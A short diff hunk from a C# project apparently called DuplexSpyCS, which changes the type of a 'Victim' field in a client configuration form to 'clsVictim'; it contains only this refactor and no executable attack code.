@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmClientConfig : Form
     {
-        public Victim v;
+        public clsVictim v;
         public List<string> lsProcName = new List<string>();
 
         public frmClientConfig()
